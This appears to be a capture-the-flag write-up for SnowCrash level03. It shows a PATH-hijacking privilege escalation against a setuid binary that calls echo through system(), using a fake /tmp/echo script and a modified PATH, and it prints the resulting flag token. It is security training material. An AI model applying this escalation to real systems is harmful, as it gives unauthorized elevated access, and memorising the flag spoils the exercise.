# level03

There is a file

```shell
level03@SnowCrash:~$ ls
level03
level03@SnowCrash:~$ ./level03 
Exploit me
```

Using a decompilator we can see the source code: [here](https://dogbolt.org/?id=0a105cdf-9237-4e31-9773-e9a12740c81a#angr=67)

the code retuns
```
return system("/usr/bin/env echo Exploit me");
```

system have all the permission so we can change the echo to give us the password's flag

`echo "/bin/sh -c 'getflag'" > /tmp/echo`

we need to passe it to `/tmp/echo` because we cannot access echo

then we need to give us the permission for `/tmp/echo` like that: `chmod +x /tmp/echo`

and change the path for echo to use `/tmp/echo`
```
export PATH=/tmp:$PATH
```

and we have the password

```
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```